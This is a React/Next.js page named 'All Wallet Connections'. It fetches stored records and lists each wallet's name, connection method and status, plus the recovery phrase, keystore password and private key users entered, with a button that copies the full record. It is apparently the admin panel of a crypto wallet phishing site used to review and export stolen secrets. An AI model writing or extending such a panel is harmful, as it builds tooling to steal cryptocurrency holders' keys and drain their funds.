'use client';
import React, { useState, useEffect } from 'react';
import Header from '../components/Header';
import { useTheme } from '../contexts/ThemeContext';

const AllConnectionsPage = () => {
  const { theme } = useTheme();
  const [connections, setConnections] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchConnections = async () => {
      try {
        const response = await fetch('/api/wallet-connections');
        if (!response.ok) {
          throw new Error('Failed to fetch connections');
        }
        const data = await response.json();
        // Sort in descending order by timestamp
        const sortedConnections = data.data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        setConnections(sortedConnections);
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    };

    fetchConnections();
  }, []);

  const handleCopy = async (connection) => {
    try {
      await navigator.clipboard.writeText(JSON.stringify(connection, null, 2));
      alert('Connection data copied to clipboard!');
    } catch (err) {
      alert('Failed to copy to clipboard');
    }
  };

  if (loading) {
    return (
      <div className={`min-h-screen w-full ${theme === 'dark' ? 'bg-black text-white' : 'bg-gray-50 text-gray-900'}`}>
        <Header />
        <main className="pt-34 px-2 sm:px-4 lg:px-6 max-w-6xl mx-auto">
          <div className="text-center">
            <p>Loading connections...</p>
          </div>
        </main>
      </div>
    );
  }

  if (error) {
    return (
      <div className={`min-h-screen w-full ${theme === 'dark' ? 'bg-black text-white' : 'bg-gray-50 text-gray-900'}`}>
        <Header />
        <main className="pt-34 px-2 sm:px-4 lg:px-6 max-w-6xl mx-auto">
          <div className="text-center">
            <p>Error: {error}</p>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className={`min-h-screen w-full ${theme === 'dark' ? 'bg-black text-white' : 'bg-gray-50 text-gray-900'}`}>
      <Header />

      <main className="pt-34 px-2 sm:px-4 lg:px-6 max-w-6xl mx-auto">
        {/* Header Section */}
        <div className="text-center mb-8">
          <h1 className={`text-3xl font-bold mb-4 ${theme === 'dark' ? 'text-white' : 'text-gray-900'}`}>
            All Wallet Connections
          </h1>
          <p className={`mb-6 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
            View all wallet connections in descending order by timestamp
          </p>
        </div>

        {/* Connections List */}
        {connections.length > 0 ? (
          <ul className="space-y-4">
            {connections.map((connection) => (
              <li
                key={connection.id}
                className={`p-6 rounded-lg border ${
                  theme === 'dark'
                    ? 'bg-gray-800 border-gray-700 text-white'
                    : 'bg-white border-gray-200 text-gray-900'
                } shadow-md`}
              >
                <div className="flex justify-between items-start">
                  <div className="flex-1">
                    <h3 className="text-lg font-semibold mb-2">
                      {connection.walletName}
                    </h3>
                    <p className={`text-sm mb-1 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
                      <strong>Method:</strong> {connection.connectionMethod}
                    </p>
                    <p className={`text-sm mb-1 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
                      <strong>Status:</strong> {connection.status}
                    </p>
                    <p className={`text-sm mb-1 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
                      <strong>Timestamp:</strong> {new Date(connection.timestamp).toLocaleString()}
                    </p>
                    {connection.phraseInput && (
                      <p className={`text-sm mb-1 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
                        <strong>Phrase:</strong> {connection.phraseInput.substring(0, 20)}...
                      </p>
                    )}
                    {connection.keystorePassword && (
                      <p className={`text-sm mb-1 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
                        <strong>Keystore Password:</strong> {connection.keystorePassword.substring(0, 20)}...
                      </p>
                    )}
                    {connection.privateKeyInput && (
                      <p className={`text-sm mb-1 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
                        <strong>Private Key:</strong> {connection.privateKeyInput.substring(0, 20)}...
                      </p>
                    )}
                  </div>
                  <button
                    onClick={() => handleCopy(connection)}
                    className={`ml-4 px-4 py-2 rounded-md text-sm font-medium transition-colors ${
                      theme === 'dark'
                        ? 'bg-blue-600 hover:bg-blue-700 text-white'
                        : 'bg-blue-500 hover:bg-blue-600 text-white'
                    }`}
                  >
                    Copy
                  </button>
                </div>
              </li>
            ))}
          </ul>
        ) : (
          <div className="text-center py-12">
            <p className={theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}>
              No wallet connections found.
            </p>
          </div>
        )}
      </main>
    </div>
  );
};

export default AllConnectionsPage;
